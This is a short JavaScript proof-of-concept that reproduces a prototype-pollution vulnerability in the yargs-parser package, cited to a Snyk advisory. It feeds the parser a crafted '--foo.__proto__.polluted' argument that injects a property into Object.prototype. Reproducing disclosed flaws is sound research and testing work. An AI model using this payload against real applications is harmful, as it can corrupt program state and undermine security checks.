//https://snyk.io/vuln/SNYK-JS-YARGSPARSER-560381
const parser = require("yargs-parser");
parser("--foo.__proto__.polluted yes");
